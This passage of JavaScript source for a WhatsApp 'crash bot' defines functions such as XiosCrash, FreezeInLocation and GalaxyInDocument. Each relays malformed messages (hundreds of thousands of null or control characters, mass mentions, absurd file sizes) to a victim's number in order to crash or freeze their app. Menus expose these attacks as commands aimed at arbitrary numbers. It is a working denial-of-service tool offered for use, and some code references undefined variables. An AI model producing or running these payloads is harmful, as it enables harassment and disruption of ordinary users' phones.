                                    "screen_1_Dropdown_0": "Fuck You",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "mark@startech.id",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}

async function GalaxyInDocument(hamz, target) {
    hamz.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "Fuck You",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "゙゙゙゙゙゙".repeat(100) + "@1".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Fuck" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: `{
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "Fuck You",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "mark@startech.id",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                            "screen_0_TextInput_1": "Why?",
                                            "screen_0_Dropdown_2": "001-Grimgar",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function FreezeInLocation(hamz, target) {

    hamz.relayMessage(target, {

        groupMentionedMessage: {

            message: {

                interactiveMessage: {

                    header: {

                        locationMessage: {

                            degreesLatitude: 0,

                            degreesLongitude: 0

                        },

                        hasMediaAttachment: true

                    },

                    body: {

                        text: "Fuck_You" + "\u0000".repeat(25000) + "ꦾ".repeat(25000) +  "@1".repeat(400000)

                    },

                    nativeFlowMessage: {},

                    contextInfo: {

                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),

                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "None" }]

                    }

                }

            }

        }

    }, { participant: { jid: target } }, { messageId: null });
};

async function iosaph(hamz, target) {
    await hamz.relayMessage(
        target, {
                'paymentInviteMessage': {
                    'serviceType': "UPI",
                    'serviceType': "FBPAY",
                    'serviceType': "yarn_info",
                    'serviceType': "PENDING",
                    'expiryTimestamp': Date.now() + 1814400000
                }
            }, {
                'participant': {
                    'jid': target
                }
            });
        }
    async function iosMJ(X, Ptcp = true) {
      await hamz.relayMessage(
        X,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: X,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "XA Team - CALL" + "\u0000".repeat(50000),
                body: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦⃝⃟⃟⃝⃟ 𝐂𝐫𝐚𝐬𝐡⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "http://t.me/MOTU_PATALU_HINDU_HAI",
                mediaUrl: "http://t.me/MOTU_PATALU_HINDU_HAI",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/OFFM0",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
    }

    async function XiosCrash(X) {
      hamz.relayMessage(
        X,
        {
          extendedTextMessage: {
            text: `𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦⃝⃟⃟⃝⃟ 𝐂𝐫𝐚𝐬𝐡⃟⃟ -` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: X,
              participant: X,
              quotedMessage: {
                conversation: "𝐇𝐚𝐦𝐳𝐗𝐚𝐭𝐞𝐚𝐦⃝⃟⃟⃝⃟ 𝐂𝐫𝐚𝐬𝐡⃟⃟" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: X,
            quoted: Filx
          },
        },
        {
          messageId: null,
        }
      );
    }
    
   async function Combo(X) {
      {
       await NewPayLoad(X) 
       await NewPayLoad(X) 
       await DocSystem2(X) 
       await DocSystem(X) 
       await NewPayLoad(X) 
       await NewPayLoad(X) 
       await DocSystem2(X) 
       await DocSystem(X) 
       await NewPayLoad(X) 
       await NewPayLoad(X) 
       await DocSystem2(X) 
       await DocSystem(X) 
       await NewPayLoad(X) 
       await NewPayLoad(X) 
       await DocSystem2(X) 
       await DocSystem(X) 
      }
   }
   async function XeonBug(X) {
      {
        await XeonHard(X) 
        await XeonButtNew(X) 
        await XeonXRobust(X) 
        await XeonHard(X) 
        await XeonXRobust(X) 
        await XeonHard(X) 
        await XeonButtNew(X) 
        await XeonButtNew(X) 
        await XeonXRobust(X) 
        await XeonHard(X) 
        await XeonButtNew(X) 
        await XeonHard(X) 
        await XeonXRobust(X) 
        await XeonHard(X) 
        await XeonButtNew(X) 
        await XeonXRobust(X) 
      }
   }
   async function DocuCombo(X) {
      {
        await docufreeze(X)
        await uidoc(X)
        await DocSystem(X) 
        await DocSystem2(X) 
        await DocSystem3(X) 
        await uidoc(X)
        await DocSystem(X) 
        await docufreeze(X)
        await DocSystem3(X) 
        await uidoc(X)
        await DocSystem2(X) 
        await docufreeze(X)
        await DocSystem(X) 
        await uidoc(X)
      }
   }
   async function FrezeiOS(X) {
      {
        await XiosCrash(X)
        await Floc(X)
        await iosMJ(X)
        await Floc(X) 
        await XiosCrash(X) 
        await iosMJ(X) 
        await XiosCrash(X) 
        await Floc(X) 
        await newfreezebug(X) 
        await XiosCrash(X) 
        await Floc(X) 
        await iosMJ(X) 
      }
   }
// END FUNCTION BUG\\


// Helper functions
async function handleCleanupSessions() {
await reply(`*Sedang menghapus cache pada bot*`);
fs.readdir("../session", async function(err, files) {
if (err) {
console.log('Tidak dapat memindai direktori: ' + err);
return reply('Tidak dapat memindai direktori: ' + err);
}
let filteredArray = files.filter(item =>
item.startsWith("pre-key") ||
item.startsWith("sender-key") ||
item.startsWith("session-") ||
item.startsWith("app-state")
);
console.log(filteredArray.length);
let teks = `🚩 Terdeteksi ${filteredArray.length} file sampah\n\n`;
if (filteredArray.length === 0) {
return reply(teks);
}
filteredArray.forEach(function(file, i) {
teks += (i + 1) + `. ${file}\n`;
});
await reply(teks);
await reply("Menghapus file sampah...");
filteredArray.forEach(function(file) {
fs.unlinkSync(`../session/${file}`);
});
await reply("🚩 Berhasil menghapus semua sampah di folder session");
});
}
async function reply(txt) {
const wwk = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: 'XA Team Crash',
newsletterJid: `${idsal}`,
},
externalAdreply: {
showAdAttribution: true,
title: 'XA Team Crash',
body: 'Hamz',
thumbnailUrl: `${image}`,
sourceUrl: 'https://t.me/hamzzz',
},
},
text: txt,
}
hamz.sendMessage(from, wwk, {
quoted: m,
})
}

const reaction = async (jidss, emoji) => {
hamz.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

switch (command) {

case 'menu': {
let menu = 
`
╭──────────〣
│ 🎭 _Name : ${pushname}_
╠══════════〣
│ 🎭 *_Name Own: Motupatlu_*
│ 🎭 *_BOT : MOtu Team_*
│ 🎭 *_Versi : Version 3_*
│ - Dev: 3584573993448 -

変 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔'\` 変
│  厷 .𝖺𝖽𝖽𝖺𝖼𝖼𝖾𝗌 918xxx
│  厷 .𝖽𝖾𝗅𝖺𝖼𝖼𝖾𝗌 918xxx
│  厷 .𝖺𝖽𝖽𝗈𝗐𝗇𝖾𝗋 918xxx
│  厷 .𝖽𝖾𝗅𝗈𝗐𝗇𝖾𝗋 918xxx
│  厷 .𝗌𝖾𝗅𝖿
│  厷 .𝗉𝗎𝖻𝗅𝗂𝖼

変 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 変
│  厷 .𝖾𝗇𝖼
│  厷 .𝖾𝗇𝖼𝗁𝖺𝗋𝖽
│  厷 .𝖽𝖾𝖼
│  厷 .𝖼𝗅𝖾𝖺𝗋𝖻𝗎𝗀 918xxx

変 \`𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔\` 変
│  厷 .𝗍𝗈𝗎𝗋𝗅
│  厷 .𝗌𝗍𝗂𝖼𝗄𝖾𝗋
│  厷 .𝗋𝗏𝗈
│  厷 .𝗁𝖽

変 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 変
│  厷 .𝗁𝗂𝖽𝖾𝗍𝖺𝗀
│  厷 .𝗍𝖺𝗀𝖺𝗅𝗅
│  厷 .𝗋𝖾𝗏𝗈𝗄𝖾
│  厷 .𝗅𝗂𝗇𝗄𝗀𝖼
│  厷 .𝖽𝖾𝗅𝖾𝗍𝖾
│  厷 .grup 𝗈𝗉𝖾𝗇
│  厷 .grup 𝖼𝗅𝗈𝗌𝖾

変 \`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\` 変
│  厷 .𝗉𝖺𝗉𝗍𝗍𝟣
│  厷 .𝗉𝖺𝗉𝗍𝗍𝟤
│  厷 .𝗉𝖺𝗉𝗍𝗍𝟥
│  厷 .𝗉𝖺𝗉𝗍𝗍𝟦
│  厷 .𝗉𝖺𝗉𝗍𝗍𝟧
│  厷 .𝖽𝖾𝗌𝖺𝗁
│  厷 .𝗉𝖺𝗉𝗄𝗇𝗍𝗅
│
変 \`𝐁𝐔𝐆 𝐌𝐄𝐍𝐔\` 変
│  厷 .𝖻𝗎𝗀𝗆𝖾𝗇𝗎
│
╰( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 )
`
await hamz.sendMessage(m.chat, {video: fs.readFileSync("./system/vidio/menu.mp4"), caption: `${menu}`, gifPlayback: true, contextInfo: {
isForwarded: true, 
forwardingScore: 999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—`, newsletterJid: `${idsal}` }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender], externalAdReply: {containsAutoReply: true, thumbnailUrl: `${image}`, title: `© 𝖧𝖺𝗆𝗓 𝖷 𝕬𝖙𝖙𝖆𝖈𝖐`, 
renderLargerThumbnail: true, sourceUrl: `${linksal}`, mediaType: 1}}}, {quoted: qtext})
await hamz.sendMessage(m.chat, {audio: fs.readFileSync("./system/audio/menu.mp3"), mimetype: "audio/mpeg", ptt: true})
}
break
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
case 'bugmenu': {
let menu = 
`
╭──────────〣
│  🎭 _Name : ${pushname}_
╠══════════〣
│  🎭 *_Name Own : Motupatlu*
│  🎭 *_Bot : Motu patlu_*
│  🎭 *_Versi : Version 3_*͏͏
│ - Dev : 3584573993448 -

変 \`𝐂𝐑𝐀𝐒𝐇 𝐕𝟏\` 変
│  厷 .𝗁𝖺𝗆𝗓𝗈𝖿𝖼 
│  厷 .𝗑𝖺𝖼𝗋𝖺𝗌𝗁𝗎𝗂 
│  厷 .𝗑𝖺𝗍𝖾𝖺𝗆 
│  厷 .𝗑𝖺𝖼𝗋𝖺𝗌𝗁 
│  厷 .𝗁𝖺𝗆𝗓𝖿𝗋𝖾𝖾𝗓𝖾
│  厷 .𝗂𝗈𝗌𝖻𝗎𝗀
│  厷 .𝗑𝗂𝗉𝗁𝗈𝗇𝖾 

╠═変 \`𝐂𝐑𝐀𝐒𝐇 𝐕𝟐\` 変
│  厷 .𝗁𝖺𝗆𝗓𝖼𝗋𝖺𝗌𝗁𝗏𝟣
│  厷 .𝗁𝖺𝗆𝗓𝖼𝗋𝖺𝗌𝗁𝗏𝟤
│  厷 .𝗁𝖺𝗆𝗓𝖼𝗋𝖺𝗌𝗁𝗏𝟥
│  厷 .𝖼𝗈𝗆𝖻𝗈𝖻𝗎𝗀
│  厷 .𝗂𝗈𝗌𝖽𝖾𝗅𝖺𝗒
│  厷 .𝗂𝗉𝗁𝗈𝗇𝖾

╠═変 \`𝐁𝐔𝐆𝐒 𝐄𝐌𝐎𝐉𝐈\` 変
│  厷 .😋 918xxx
│  厷 .😈 918xxx
│  厷 .🔥 918xxx
│  厷 .💥 918xxx
│  厷 .💣 918xxx

変 \`𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑\` 変
│  厷 .𝗈𝗐𝗇𝗁𝖺𝗋𝖽 918xxx
│  厷 .𝖼𝗋𝖺𝗌𝗁𝗈𝗐𝗇 918xxx
│  厷 .𝗑𝗈𝗐𝗇 918xxx

変 \`𝐁𝐔𝐆𝐒 𝐃𝐈𝐓𝐄𝐌𝐏𝐀𝐓\` 変
│  厷 .motu-patlu?
│  厷 .𝖽𝗂𝖼𝖺𝗋𝗂𝗂𝗇𝗁𝖺𝗆𝗓
│  厷 .𝖻𝖺𝗇𝗀-𝖺𝖽𝖺-𝗉𝖺𝗇𝖾𝗅?
│
╰( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 𝗠𝗢𝗧𝗨 𝗣𝗔𝗧𝗟𝗨 )
`
await hamz.sendMessage(m.chat, {video: fs.readFileSync("./system/vidio/menu.mp4"), caption: `${menu}`, gifPlayback: true, contextInfo: {
isForwarded: true, 
forwardingScore: 999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `🩸⃟⃨〫⃰‣ ⁖𝐇𝐚𝐦𝐳 𝐗𝐀 𝐓𝐞𝐚𝐦 ‣—`, newsletterJid: `${idsal}` }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender], externalAdReply: {containsAutoReply: true, thumbnailUrl: `${image}`, title: `© 𝖧𝖺𝗆𝗓 𝖷 𝕬𝖙𝖙𝖆𝖈𝖐`, 
renderLargerThumbnail: true, sourceUrl: `${linksal}`, mediaType: 1}}}, {quoted: qtext})
await hamz.sendMessage(m.chat, {audio: fs.readFileSync("./system/audio/menu.mp3"), mimetype: "audio/mpeg", ptt: true})
}


// FITUR TAMBAHAN //
break
case 'clearbug': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ')
if (!q) return reply(`Penggunaan ${prefix + command} 918xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let X = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await hamz.sendMessage(X, {text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
});
}
reply("Done clear bug");
}





// BOT COMMAND 
break
case "public": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
hamz.public = true
reply('*Success Changes To Public*');
}
break
case "self": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
hamz.public = false
reply('*Success Changes To Self*');
}








// ACCES FEATURE
break
case "addacces": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 918xxx`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await hamz.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
accces.push(bnnd)
fs.writeFileSync('./system/database/access.json', JSON.stringify(accces))
reply(`Numbers ${bnnd} Success Add Acess!!!`);
}
break
case "delacces": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
X = q.split("|")[0].replace(/[^0-9]/g, '')
unp = accces.indexOf(ya)
accces.splice(unp, 1)
fs.writeFileSync('./system/database/access.json', JSON.stringify(accces))
reply(`Numbers ${X} Succes Detele To Acces!!!`);
}
break
case "addowner": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await TheFeb.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./system/database/owner.json', JSON.stringify(kontributor))
reply(`Numbers ${bnnd} Success Add Owner!!!`);
}
break
case "delowner": {
if (!isOwner) return reply(' _𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖮𝗐𝗇𝖾𝗋*_ ')
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
X = q.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(ya)
kontributor.splice(unp, 1)
fs.writeFileSync('./system/database/owner.json', JSON.stringify(kontributor))
reply(`Numbers ${X} Succes Detele To Owner!!!`);
}





// BUG COMMAND
break
case 'hamzofc': 
case '😋': {
if (!isAcces && !isOwner) return reply(' _𝐒𝐎𝐊 𝐀𝐒𝐈𝐊 𝐊𝐍𝐓𝐋 *𝖪𝗁𝗎𝗌𝗎𝗌 𝖬𝖾𝗆𝖻𝖾𝗋 𝖵𝖨𝖯*, _𝖢𝗁𝖺𝗍 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖲𝗎𝗉𝖺𝗒𝖺 𝖬𝖾𝗇𝖽𝖺𝗉𝖺𝗍𝗄𝖺𝗇 𝖠𝗄𝗌𝖾𝗌_ ');
if (!q) return reply(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
